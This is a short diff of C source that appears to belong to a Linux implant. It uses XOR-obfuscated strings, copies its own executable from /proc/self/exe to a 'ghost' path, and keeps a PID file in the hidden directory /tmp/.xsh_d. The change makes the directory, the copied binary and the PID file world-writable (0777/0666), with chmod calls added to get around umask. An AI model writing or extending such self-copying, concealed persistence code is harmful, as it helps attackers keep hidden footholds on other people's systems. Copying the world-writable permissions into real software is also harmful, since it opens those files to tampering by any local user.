@@ -109,12 +109,13 @@ static void backup_self()
     strncpy(ghost_path, XorString(GHOST_PATH), sizeof(ghost_path));
     strncpy(proc_exe, XorString("/proc/self/exe"), sizeof(proc_exe));
 
-    mkdir(dir_path, 0755);
+    mkdir(dir_path, 0777);
+    chmod(dir_path, 0777); /* mkdir 受 umask 影响，chmod 确保 0777 */
 
     char buf[4096];
     int src = open(proc_exe, O_RDONLY);
     if (src < 0) return;
-    int dst = open(ghost_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    int dst = open(ghost_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
     if (dst < 0) { close(src); return; }
     int n;
     while ((n = read(src, buf, sizeof(buf))) > 0)
@@ -134,10 +135,11 @@ static void write_pid_file()
     strncpy(dir_path, XorString("/tmp/.xsh_d"), sizeof(dir_path));
     strncpy(pid_path, XorString(PID_FILE), sizeof(pid_path));
 
-    mkdir(dir_path, 0755); /* 确保目录存在（ghost 跳过了 backup_self） */
+    mkdir(dir_path, 0777);
+    chmod(dir_path, 0777);
     char buf[32];
     int n = snprintf(buf, sizeof(buf), "%d", getpid());
-    int fd = open(pid_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    int fd = open(pid_path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
     if (fd >= 0)
     {
         write(fd, buf, n);
